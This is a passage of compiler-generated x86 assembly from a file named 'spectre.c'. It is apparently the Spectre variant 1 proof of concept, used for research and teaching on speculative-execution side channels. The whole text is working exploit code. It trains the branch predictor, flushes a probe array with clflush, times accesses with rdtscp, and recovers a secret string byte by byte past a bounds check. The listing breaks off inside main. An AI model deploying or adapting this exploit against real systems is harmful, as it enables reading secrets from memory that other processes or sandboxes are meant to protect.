	.text
	.intel_syntax noprefix
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	call	.L0$pb
	.cfi_adjust_cfa_offset 4
.L0$pb:
	pop	eax
	.cfi_adjust_cfa_offset -4
.Ltmp0:
	add	eax, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp0-.L0$pb)
	mov	ecx, dword ptr [eax + array1_size@GOTOFF]
	xor	eax, eax
	cmp	ecx, dword ptr [esp + 4]
	seta	al
	ret
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	leak_data                       # -- Begin function leak_data
	.p2align	4, 0x90
	.type	leak_data,@function
leak_data:                              # @leak_data
	.cfi_startproc
# %bb.0:
	call	.L1$pb
	.cfi_adjust_cfa_offset 4
.L1$pb:
	pop	eax
	.cfi_adjust_cfa_offset -4
.Ltmp1:
	add	eax, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp1-.L1$pb)
	mov	ecx, dword ptr [esp + 4]
	mov	ecx, dword ptr [ecx]
	cmp	ecx, dword ptr [eax + array1_size@GOTOFF]
	jae	.LBB1_2
# %bb.1:
	movzx	ecx, byte ptr [eax + ecx + array1@GOTOFF]
	shl	ecx, 9
	mov	cl, byte ptr [eax + ecx + array2@GOTOFF]
	and	byte ptr [eax + temp@GOTOFF], cl
.LBB1_2:
	ret
.Lfunc_end1:
	.size	leak_data, .Lfunc_end1-leak_data
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	push	ebx
	.cfi_def_cfa_offset 8
	sub	esp, 8
	.cfi_def_cfa_offset 16
	.cfi_offset ebx, -8
	call	.L2$pb
	.cfi_adjust_cfa_offset 4
.L2$pb:
	pop	ebx
	.cfi_adjust_cfa_offset -4
.Ltmp2:
	add	ebx, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp2-.L2$pb)
	lea	eax, [esp + 16]
	mov	dword ptr [esp], eax
	call	leak_data
	add	esp, 8
	.cfi_def_cfa_offset 8
	pop	ebx
	.cfi_def_cfa_offset 4
	ret
.Lfunc_end2:
	.size	victim_function, .Lfunc_end2-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	push	ebx
	.cfi_def_cfa_offset 12
	push	edi
	.cfi_def_cfa_offset 16
	push	esi
	.cfi_def_cfa_offset 20
	sub	esp, 28
	.cfi_def_cfa_offset 48
	.cfi_offset esi, -20
	.cfi_offset edi, -16
	.cfi_offset ebx, -12
	.cfi_offset ebp, -8
	call	.L3$pb
	.cfi_adjust_cfa_offset 4
.L3$pb:
	pop	ebx
	.cfi_adjust_cfa_offset -4
.Ltmp3:
	add	ebx, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp3-.L3$pb)
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [ebx + readMemoryByte.results@GOTOFF]
	push	1024
	.cfi_adjust_cfa_offset 4
	push	0
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	memset@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	dword ptr [esp + 12], 999       # 4-byte Folded Spill
	.p2align	4, 0x90
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_2 Depth 2
                                        #     Child Loop BB3_4 Depth 2
                                        #       Child Loop BB3_29 Depth 3
                                        #     Child Loop BB3_7 Depth 2
                                        #     Child Loop BB3_12 Depth 2
	xor	eax, eax
	.p2align	4, 0x90
.LBB3_2:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	byte ptr [ebx + eax + array2@GOTOFF]
	clflush	byte ptr [ebx + eax + array2@GOTOFF+512]
	clflush	byte ptr [ebx + eax + array2@GOTOFF+1024]
	clflush	byte ptr [ebx + eax + array2@GOTOFF+1536]
	clflush	byte ptr [ebx + eax + array2@GOTOFF+2048]
	clflush	byte ptr [ebx + eax + array2@GOTOFF+2560]
	clflush	byte ptr [ebx + eax + array2@GOTOFF+3072]
	clflush	byte ptr [ebx + eax + array2@GOTOFF+3584]
	add	eax, 4096
	cmp	eax, 131072
	jne	.LBB3_2
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	mov	eax, dword ptr [esp + 12]       # 4-byte Reload
	cdq
	idiv	dword ptr [ebx + array1_size@GOTOFF]
	mov	edi, edx
	mov	esi, edx
	xor	edi, dword ptr [esp + 48]
	mov	ebp, 29
	jmp	.LBB3_4
	.p2align	4, 0x90
.LBB3_5:                                #   in Loop: Header=BB3_4 Depth=2
	mov	eax, ebp
	mov	ecx, -1431655765
	mul	ecx
	shr	edx
	and	edx, -2
	lea	eax, [edx + 2*edx]
	not	eax
	add	eax, ebp
	mov	ecx, eax
	and	ecx, -65536
	shr	eax, 16
	or	eax, ecx
	and	eax, edi
	xor	eax, esi
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	push	eax
	.cfi_adjust_cfa_offset 4
	call	victim_function
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	sub	ebp, 1
	jb	.LBB3_6
.LBB3_4:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_29 Depth 3
	clflush	byte ptr [ebx + array1_size@GOTOFF]
	mov	dword ptr [esp + 20], 0
	mov	eax, dword ptr [esp + 20]
	cmp	eax, 99
	jg	.LBB3_5
	.p2align	4, 0x90
.LBB3_29:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	add	dword ptr [esp + 20], 1
	mov	eax, dword ptr [esp + 20]
	cmp	eax, 100
	jl	.LBB3_29
	jmp	.LBB3_5
	.p2align	4, 0x90
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	mov	ecx, 13
	jmp	.LBB3_7
	.p2align	4, 0x90
.LBB3_10:                               #   in Loop: Header=BB3_7 Depth=2
	add	ecx, 167
	cmp	ecx, 42765
	je	.LBB3_11
.LBB3_7:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	mov	dword ptr [esp + 16], ecx       # 4-byte Spill
	movzx	esi, cl
	mov	eax, esi
	mov	dword ptr [esp + 24], esi       # 4-byte Spill
	shl	esi, 9
	rdtscp
	mov	edi, eax
	mov	ebp, edx
	movzx	eax, byte ptr [ebx + esi + array2@GOTOFF]
	rdtscp
	mov	esi, ecx
	sub	eax, edi
	sbb	edx, ebp
	mov	ecx, 100
	cmp	ecx, eax
	mov	ecx, dword ptr [esp + 16]       # 4-byte Reload
	mov	eax, 0
	sbb	eax, edx
	jb	.LBB3_10
# %bb.8:                                #   in Loop: Header=BB3_7 Depth=2
	mov	eax, dword ptr [esp + 12]       # 4-byte Reload
	cdq
	idiv	dword ptr [ebx + array1_size@GOTOFF]
	cmp	cl, byte ptr [ebx + edx + array1@GOTOFF]
	je	.LBB3_10
# %bb.9:                                #   in Loop: Header=BB3_7 Depth=2
	mov	eax, dword ptr [esp + 24]       # 4-byte Reload
	add	dword ptr [ebx + 4*eax + readMemoryByte.results@GOTOFF], 1
	jmp	.LBB3_10
	.p2align	4, 0x90
.LBB3_11:                               #   in Loop: Header=BB3_1 Depth=1
	mov	dword ptr [esp + 16], esi       # 4-byte Spill
	mov	eax, -1
	xor	edi, edi
	lea	ebp, [ebx + readMemoryByte.results@GOTOFF+4]
	mov	ecx, -1
	jmp	.LBB3_12
	.p2align	4, 0x90
.LBB3_19:                               #   in Loop: Header=BB3_12 Depth=2
	mov	ecx, eax
	mov	eax, esi
.LBB3_24:                               #   in Loop: Header=BB3_12 Depth=2
	add	edi, 2
	add	ebp, 8
	cmp	edi, 256
	je	.LBB3_25
.LBB3_12:                               #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	test	eax, eax
	js	.LBB3_13
# %bb.14:                               #   in Loop: Header=BB3_12 Depth=2
	mov	edx, dword ptr [ebp - 4]
	cmp	edx, dword ptr [ebx + 4*eax + readMemoryByte.results@GOTOFF]
	jge	.LBB3_13
# %bb.15:                               #   in Loop: Header=BB3_12 Depth=2
	test	ecx, ecx
	js	.LBB3_17
# %bb.16:                               #   in Loop: Header=BB3_12 Depth=2
	cmp	edx, dword ptr [ebx + 4*ecx + readMemoryByte.results@GOTOFF]
	jl	.LBB3_18
.LBB3_17:                               #   in Loop: Header=BB3_12 Depth=2
	mov	ecx, edi
.LBB3_18:                               #   in Loop: Header=BB3_12 Depth=2
	lea	esi, [edi + 1]
	test	eax, eax
	jns	.LBB3_20
	jmp	.LBB3_19
	.p2align	4, 0x90
.LBB3_13:                               #   in Loop: Header=BB3_12 Depth=2
	mov	ecx, eax
	mov	eax, edi
	lea	esi, [edi + 1]
	test	eax, eax
	js	.LBB3_19
.LBB3_20:                               #   in Loop: Header=BB3_12 Depth=2
	mov	edx, dword ptr [ebp]
	cmp	edx, dword ptr [ebx + 4*eax + readMemoryByte.results@GOTOFF]
	jge	.LBB3_19
# %bb.21:                               #   in Loop: Header=BB3_12 Depth=2
	test	ecx, ecx
	js	.LBB3_23
# %bb.22:                               #   in Loop: Header=BB3_12 Depth=2
	cmp	edx, dword ptr [ebx + 4*ecx + readMemoryByte.results@GOTOFF]
	jl	.LBB3_24
.LBB3_23:                               #   in Loop: Header=BB3_12 Depth=2
	mov	ecx, esi
	jmp	.LBB3_24
	.p2align	4, 0x90
.LBB3_25:                               #   in Loop: Header=BB3_1 Depth=1
	mov	edi, dword ptr [ebx + 4*eax + readMemoryByte.results@GOTOFF]
	mov	esi, dword ptr [ebx + 4*ecx + readMemoryByte.results@GOTOFF]
	lea	edx, [esi + esi]
	add	edx, 5
	cmp	edi, edx
	jge	.LBB3_28
# %bb.26:                               #   in Loop: Header=BB3_1 Depth=1
	xor	edi, 2
	or	edi, esi
	je	.LBB3_28
# %bb.27:                               #   in Loop: Header=BB3_1 Depth=1
	mov	esi, dword ptr [esp + 12]       # 4-byte Reload
	lea	edx, [esi - 1]
	cmp	esi, 1
	mov	dword ptr [esp + 12], edx       # 4-byte Spill
	ja	.LBB3_1
.LBB3_28:
	mov	edx, dword ptr [esp + 16]       # 4-byte Reload
	xor	dword ptr [ebx + readMemoryByte.results@GOTOFF], edx
	mov	esi, dword ptr [esp + 52]
	mov	byte ptr [esi], al
	mov	eax, dword ptr [ebx + 4*eax + readMemoryByte.results@GOTOFF]
	mov	edx, dword ptr [esp + 56]
	mov	dword ptr [edx], eax
	mov	byte ptr [esi + 1], cl
	mov	eax, dword ptr [ebx + 4*ecx + readMemoryByte.results@GOTOFF]
	mov	dword ptr [edx + 4], eax
	add	esp, 28
	.cfi_def_cfa_offset 20
	pop	esi
	.cfi_def_cfa_offset 16
	pop	edi
	.cfi_def_cfa_offset 12
	pop	ebx
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_def_cfa_offset 4
	ret
.Lfunc_end3:
	.size	readMemoryByte, .Lfunc_end3-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	push	ebx
	.cfi_def_cfa_offset 12
	push	edi
	.cfi_def_cfa_offset 16
	push	esi
	.cfi_def_cfa_offset 20
	sub	esp, 76
	.cfi_def_cfa_offset 96
	.cfi_offset esi, -20
	.cfi_offset edi, -16
	.cfi_offset ebx, -12
	.cfi_offset ebp, -8
	call	.L4$pb
	.cfi_adjust_cfa_offset 4
.L4$pb:
	pop	ebx
	.cfi_adjust_cfa_offset -4
.Ltmp4:
	add	ebx, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp4-.L4$pb)
	mov	eax, dword ptr [ebx + stdin@GOT]
	mov	dword ptr [esp + 64], eax       # 4-byte Spill
	lea	eax, [ebx + check@GOTOFF]
	mov	dword ptr [esp + 60], eax       # 4-byte Spill
	lea	eax, [ebx + .L.str.13@GOTOFF]
	mov	dword ptr [esp + 56], eax       # 4-byte Spill
	lea	eax, [ebx + .L.str.1@GOTOFF]
	mov	dword ptr [esp + 52], eax       # 4-byte Spill
	lea	eax, [ebx + array1@GOTOFF]
	mov	dword ptr [esp + 40], eax       # 4-byte Spill
	lea	eax, [ebx + array2@GOTOFF]
	mov	dword ptr [esp + 48], eax       # 4-byte Spill
	lea	eax, [ebx + .L.str.2@GOTOFF]
	mov	dword ptr [esp + 44], eax       # 4-byte Spill
	mov	dword ptr [esp + 28], ebx       # 4-byte Spill
	jmp	.LBB4_1
	.p2align	4, 0x90
.LBB4_39:                               #   in Loop: Header=BB4_1 Depth=1
	mov	ebx, dword ptr [esp + 28]       # 4-byte Reload
	call	getpid@PLT
	xor	ecx, ecx
	mov	edx, dword ptr [esp + 60]       # 4-byte Reload
	add	edx, 33
	setb	cl
	push	eax
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	edx
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 68]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
.LBB4_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB4_8 Depth 2
                                        #       Child Loop BB4_9 Depth 3
                                        #         Child Loop BB4_10 Depth 4
                                        #         Child Loop BB4_12 Depth 4
                                        #           Child Loop BB4_41 Depth 5
                                        #         Child Loop BB4_15 Depth 4
                                        #         Child Loop BB4_20 Depth 4
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	mov	eax, dword ptr [esp + 76]       # 4-byte Reload
	push	dword ptr [eax]
	.cfi_adjust_cfa_offset 4
	call	getc@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	shl	eax, 24
	cmp	eax, 167772160
	je	.LBB4_1
# %bb.2:                                #   in Loop: Header=BB4_1 Depth=1
	cmp	eax, 1761607680
	je	.LBB4_39
# %bb.3:                                #   in Loop: Header=BB4_1 Depth=1
	cmp	eax, 1912602624
	jne	.LBB4_40
# %bb.4:                                #   in Loop: Header=BB4_1 Depth=1
	mov	ebx, dword ptr [esp + 28]       # 4-byte Reload
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 64]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	mov	ecx, eax
	sub	ecx, dword ptr [esp + 40]       # 4-byte Folded Reload
	mov	dword ptr [esp + 20], ecx
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	push	eax
	.cfi_adjust_cfa_offset 4
	call	strlen@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	edi, eax
	mov	dword ptr [esp + 16], eax
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	push	131072
	.cfi_adjust_cfa_offset 4
	push	1
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 60]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	memset@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	cmp	dword ptr [esp + 96], 3
	jne	.LBB4_6
# %bb.5:                                #   in Loop: Header=BB4_1 Depth=1
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [esp + 24]
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 52]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	mov	esi, dword ptr [esp + 112]
	push	dword ptr [esi + 4]
	.cfi_adjust_cfa_offset 4
	call	__isoc99_sscanf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 40]       # 4-byte Reload
	sub	dword ptr [esp + 20], eax
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [ebx + .L.str.3@GOTOFF]
	lea	ecx, [esp + 20]
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esi + 8]
	.cfi_adjust_cfa_offset 4
	call	__isoc99_sscanf@PLT
	add	esp, 12
	.cfi_adjust_cfa_offset -12
	lea	eax, [ebx + .L.str.4@GOTOFF]
	push	dword ptr [esp + 20]
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 28]
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	edi, dword ptr [esp + 16]
.LBB4_6:                                #   in Loop: Header=BB4_1 Depth=1
	sub	esp, 8
	.cfi_adjust_cfa_offset 8
	lea	eax, [ebx + .L.str.5@GOTOFF]
	push	edi
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 16]
	lea	ecx, [eax - 1]
	mov	dword ptr [esp + 16], ecx
	test	eax, eax
	jle	.LBB4_1
# %bb.7:                                #   in Loop: Header=BB4_1 Depth=1
	xor	esi, esi
	jmp	.LBB4_8
	.p2align	4, 0x90
.LBB4_38:                               #   in Loop: Header=BB4_8 Depth=2
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	push	10
	.cfi_adjust_cfa_offset 4
	call	putchar@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 16]
	lea	ecx, [eax - 1]
	mov	dword ptr [esp + 16], ecx
	test	eax, eax
	mov	esi, dword ptr [esp + 68]       # 4-byte Reload
	jle	.LBB4_1
.LBB4_8:                                #   Parent Loop BB4_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB4_9 Depth 3
                                        #         Child Loop BB4_10 Depth 4
                                        #         Child Loop BB4_12 Depth 4
                                        #           Child Loop BB4_41 Depth 5
                                        #         Child Loop BB4_15 Depth 4
                                        #         Child Loop BB4_20 Depth 4
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	movsx	eax, byte ptr [eax + esi]
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	ecx, [ebx + .L.str.6@GOTOFF]
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 28]
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	add	esi, 1
	mov	dword ptr [esp + 68], esi       # 4-byte Spill
	mov	eax, dword ptr [esp + 20]
	mov	dword ptr [esp + 72], eax       # 4-byte Spill
	add	eax, 1
	mov	dword ptr [esp + 20], eax
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [ebx + readMemoryByte.results@GOTOFF]
	push	1024
	.cfi_adjust_cfa_offset 4
	push	0
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	memset@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	dword ptr [esp + 24], 999       # 4-byte Folded Spill
	.p2align	4, 0x90
.LBB4_9:                                #   Parent Loop BB4_1 Depth=1
                                        #     Parent Loop BB4_8 Depth=2
                                        # =>    This Loop Header: Depth=3
                                        #         Child Loop BB4_10 Depth 4
                                        #         Child Loop BB4_12 Depth 4
                                        #           Child Loop BB4_41 Depth 5
                                        #         Child Loop BB4_15 Depth 4
                                        #         Child Loop BB4_20 Depth 4
	xor	eax, eax
	.p2align	4, 0x90
.LBB4_10:                               #   Parent Loop BB4_1 Depth=1
                                        #     Parent Loop BB4_8 Depth=2
                                        #       Parent Loop BB4_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	clflush	byte ptr [ebx + eax + array2@GOTOFF]
	clflush	byte ptr [ebx + eax + array2@GOTOFF+512]
	clflush	byte ptr [ebx + eax + array2@GOTOFF+1024]
	clflush	byte ptr [ebx + eax + array2@GOTOFF+1536]
	clflush	byte ptr [ebx + eax + array2@GOTOFF+2048]
	clflush	byte ptr [ebx + eax + array2@GOTOFF+2560]
	clflush	byte ptr [ebx + eax + array2@GOTOFF+3072]
	clflush	byte ptr [ebx + eax + array2@GOTOFF+3584]
	add	eax, 4096
	cmp	eax, 131072
	jne	.LBB4_10
# %bb.11:                               #   in Loop: Header=BB4_9 Depth=3
	mov	eax, dword ptr [esp + 24]       # 4-byte Reload
	cdq
	idiv	dword ptr [ebx + array1_size@GOTOFF]
	mov	edi, edx
	mov	esi, edx
	xor	edi, dword ptr [esp + 72]       # 4-byte Folded Reload
	mov	ebp, 29
	jmp	.LBB4_12
	.p2align	4, 0x90
.LBB4_13:                               #   in Loop: Header=BB4_12 Depth=4
	mov	eax, ebp
	mov	ecx, -1431655765
	mul	ecx
	shr	edx
	and	edx, -2
	lea	eax, [edx + 2*edx]
	not	eax
	add	eax, ebp
	mov	ecx, eax
	and	ecx, -65536
	shr	eax, 16
	or	eax, ecx
	and	eax, edi
	xor	eax, esi
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	push	eax
	.cfi_adjust_cfa_offset 4
	call	victim_function
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	sub	ebp, 1
	jb	.LBB4_14
.LBB4_12:                               #   Parent Loop BB4_1 Depth=1
                                        #     Parent Loop BB4_8 Depth=2
                                        #       Parent Loop BB4_9 Depth=3
                                        # =>      This Loop Header: Depth=4
                                        #           Child Loop BB4_41 Depth 5
	clflush	byte ptr [ebx + array1_size@GOTOFF]
	mov	dword ptr [esp + 36], 0
	mov	eax, dword ptr [esp + 36]
	cmp	eax, 99
	jg	.LBB4_13
	.p2align	4, 0x90
.LBB4_41:                               #   Parent Loop BB4_1 Depth=1
                                        #     Parent Loop BB4_8 Depth=2
                                        #       Parent Loop BB4_9 Depth=3
                                        #         Parent Loop BB4_12 Depth=4
                                        # =>        This Inner Loop Header: Depth=5
	add	dword ptr [esp + 36], 1
	mov	eax, dword ptr [esp + 36]
	cmp	eax, 100
	jl	.LBB4_41
	jmp	.LBB4_13
	.p2align	4, 0x90
.LBB4_14:                               #   in Loop: Header=BB4_9 Depth=3
	mov	ebx, 13
	jmp	.LBB4_15
	.p2align	4, 0x90
.LBB4_18:                               #   in Loop: Header=BB4_15 Depth=4
	add	ebx, 167
	cmp	ebx, 42765
	je	.LBB4_19
.LBB4_15:                               #   Parent Loop BB4_1 Depth=1
                                        #     Parent Loop BB4_8 Depth=2
                                        #       Parent Loop BB4_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	movzx	esi, bl
	mov	eax, esi
	mov	dword ptr [esp + 32], esi       # 4-byte Spill
	shl	esi, 9
	rdtscp
	mov	edi, eax
	mov	dword ptr [esp + 12], edx       # 4-byte Spill
	mov	ebp, dword ptr [esp + 28]       # 4-byte Reload
	movzx	eax, byte ptr [ebp + esi + array2@GOTOFF]
	rdtscp
	sub	eax, edi
	sbb	edx, dword ptr [esp + 12]       # 4-byte Folded Reload
	mov	esi, 100
	cmp	esi, eax
	mov	eax, 0
	sbb	eax, edx
	jb	.LBB4_18
# %bb.16:                               #   in Loop: Header=BB4_15 Depth=4
	mov	eax, dword ptr [esp + 24]       # 4-byte Reload
	cdq
	idiv	dword ptr [ebp + array1_size@GOTOFF]
	cmp	bl, byte ptr [ebp + edx + array1@GOTOFF]
	je	.LBB4_18
# %bb.17:                               #   in Loop: Header=BB4_15 Depth=4
	mov	eax, dword ptr [esp + 32]       # 4-byte Reload
	add	dword ptr [ebp + 4*eax + readMemoryByte.results@GOTOFF], 1
	jmp	.LBB4_18
	.p2align	4, 0x90
.LBB4_19:                               #   in Loop: Header=BB4_9 Depth=3
	mov	dword ptr [esp + 32], ecx       # 4-byte Spill
	mov	ecx, -1
	xor	eax, eax
	mov	ebx, dword ptr [esp + 28]       # 4-byte Reload
	lea	edx, [ebx + readMemoryByte.results@GOTOFF+4]
	mov	dword ptr [esp + 12], -1        # 4-byte Folded Spill
	jmp	.LBB4_20
	.p2align	4, 0x90
.LBB4_27:                               #   in Loop: Header=BB4_20 Depth=4
	mov	dword ptr [esp + 12], ecx       # 4-byte Spill
	mov	ecx, esi
.LBB4_32:                               #   in Loop: Header=BB4_20 Depth=4
	add	eax, 2
	add	edx, 8
	cmp	eax, 256
	je	.LBB4_33
.LBB4_20:                               #   Parent Loop BB4_1 Depth=1
                                        #     Parent Loop BB4_8 Depth=2
                                        #       Parent Loop BB4_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	mov	edi, ecx
	test	ecx, ecx
	js	.LBB4_21
# %bb.22:                               #   in Loop: Header=BB4_20 Depth=4
	mov	esi, dword ptr [edx - 4]
	cmp	esi, dword ptr [ebx + 4*edi + readMemoryByte.results@GOTOFF]
	jge	.LBB4_21
# %bb.23:                               #   in Loop: Header=BB4_20 Depth=4
	mov	edi, dword ptr [esp + 12]       # 4-byte Reload
	test	edi, edi
	js	.LBB4_25
# %bb.24:                               #   in Loop: Header=BB4_20 Depth=4
	cmp	esi, dword ptr [ebx + 4*edi + readMemoryByte.results@GOTOFF]
	jl	.LBB4_26
.LBB4_25:                               #   in Loop: Header=BB4_20 Depth=4
	mov	dword ptr [esp + 12], eax       # 4-byte Spill
.LBB4_26:                               #   in Loop: Header=BB4_20 Depth=4
	lea	esi, [eax + 1]
	test	ecx, ecx
	jns	.LBB4_28
	jmp	.LBB4_27
	.p2align	4, 0x90
.LBB4_21:                               #   in Loop: Header=BB4_20 Depth=4
	mov	dword ptr [esp + 12], edi       # 4-byte Spill
	mov	ecx, eax
	lea	esi, [eax + 1]
	test	ecx, ecx
	js	.LBB4_27
.LBB4_28:                               #   in Loop: Header=BB4_20 Depth=4
	mov	edi, dword ptr [edx]
	cmp	edi, dword ptr [ebx + 4*ecx + readMemoryByte.results@GOTOFF]
	jge	.LBB4_27
# %bb.29:                               #   in Loop: Header=BB4_20 Depth=4
	mov	ebp, dword ptr [esp + 12]       # 4-byte Reload
	test	ebp, ebp
	js	.LBB4_31
# %bb.30:                               #   in Loop: Header=BB4_20 Depth=4
	cmp	edi, dword ptr [ebx + 4*ebp + readMemoryByte.results@GOTOFF]
	jl	.LBB4_32
.LBB4_31:                               #   in Loop: Header=BB4_20 Depth=4
	mov	dword ptr [esp + 12], esi       # 4-byte Spill
	jmp	.LBB4_32
	.p2align	4, 0x90
.LBB4_33:                               #   in Loop: Header=BB4_9 Depth=3
	mov	eax, ecx
	mov	eax, dword ptr [ebx + 4*ecx + readMemoryByte.results@GOTOFF]
	mov	edx, dword ptr [esp + 12]       # 4-byte Reload
	mov	edx, dword ptr [ebx + 4*edx + readMemoryByte.results@GOTOFF]
	lea	esi, [edx + edx]
	add	esi, 5
	cmp	eax, esi
	jge	.LBB4_36
# %bb.34:                               #   in Loop: Header=BB4_9 Depth=3
	xor	eax, 2
	or	eax, edx
	je	.LBB4_36
# %bb.35:                               #   in Loop: Header=BB4_9 Depth=3
	mov	edx, dword ptr [esp + 24]       # 4-byte Reload
	lea	eax, [edx - 1]
	cmp	edx, 1
	mov	dword ptr [esp + 24], eax       # 4-byte Spill
	ja	.LBB4_9
.LBB4_36:                               #   in Loop: Header=BB4_8 Depth=2
	mov	eax, dword ptr [esp + 32]       # 4-byte Reload
	xor	dword ptr [ebx + readMemoryByte.results@GOTOFF], eax
	mov	ebp, ecx
	mov	esi, dword ptr [ebx + 4*ecx + readMemoryByte.results@GOTOFF]
	mov	eax, dword ptr [esp + 12]       # 4-byte Reload
	mov	edi, dword ptr [ebx + 4*eax + readMemoryByte.results@GOTOFF]
	lea	eax, [edi + edi]
	cmp	esi, eax
	lea	eax, [ebx + .L.str.9@GOTOFF]
	lea	ecx, [ebx + .L.str.8@GOTOFF]
	cmovl	ecx, eax
	sub	esp, 8
	.cfi_adjust_cfa_offset 8
	lea	eax, [ebx + .L.str.7@GOTOFF]
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	ecx, ebp
	movzx	eax, cl
	add	cl, -32
	cmp	cl, 95
	mov	ecx, 63
	cmovb	ecx, eax
	lea	edx, [ebx + .L.str.10@GOTOFF]
	push	esi
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	edx
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	test	edi, edi
	jle	.LBB4_38
# %bb.37:                               #   in Loop: Header=BB4_8 Depth=2
	mov	ecx, dword ptr [esp + 12]       # 4-byte Reload
	movzx	eax, cl
	add	cl, -32
	cmp	cl, 95
	mov	ecx, 63
	cmovb	ecx, eax
	lea	edx, [ebx + .L.str.11@GOTOFF]
	push	edi
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	edx
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
